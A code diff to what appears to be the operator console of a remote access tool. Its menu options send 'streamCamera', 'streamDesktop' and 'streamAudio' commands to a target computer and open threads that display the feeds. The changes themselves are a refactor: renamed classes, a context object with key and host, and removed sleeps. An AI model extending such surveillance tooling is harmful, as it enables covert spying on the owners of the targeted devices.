@@ -107,9 +107,10 @@ class main:
             uiprint("Pres Enter to continue")
             input(f"{self.indent}>>")
 
-    class playAudio:
-        def __init__(self, target, key):
-            self.key = key
+    class Audio:
+        def __init__(self, target, ctx):
+            self.key = ctx.key
+            self.host = ctx.host
             self.Stop = False
             self.target = target
             if os.path.exists("/sounds"):
@@ -185,9 +186,10 @@ class main:
             self.window.destroy()
             self.Stop = True
 
-    class displayVideo:
-        def __init__(self, target, option):
-            self.key = key
+    class Video:
+        def __init__(self, target, option, ctx):
+            self.key = ctx.key
+            self.host = ctx.host
             self.Stop = False
             self.display(target, option)
 
@@ -352,18 +354,16 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
         elif choice == 6:
             self.showComputers()
             self.sendCommand("streamCamera", self.target)
-            time.sleep(3)
             try:
-                threading.Thread(target=self.displayVideo, args=(self.target, 0)).start()
+                threading.Thread(target=self.Video, args=(self.target, 0, self)).start()
             except:
                 pass
 
         elif choice == 7:
             self.showComputers()
             self.sendCommand("streamDesktop", self.target)
-            time.sleep(3)
             try:
-                threading.Thread(target=self.displayVideo, args=(self.target, 1)).start()
+                threading.Thread(target=self.Video, args=(self.target, 1, self)).start()
             except:
                 pass
 
@@ -379,12 +379,9 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
             self.showComputers()
             self.sendCommand("streamAudio", self.target)
             try:
-                threading.Thread(target=self.playAudio, args=(self.target,)).start()
+                threading.Thread(target=self.Audio, args=(self.target, self)).start()
             except Exception as e:
-                print(e)
                 pass
-
-            time.sleep(10000)
 
         elif choice == 11:
             self.showComputers()
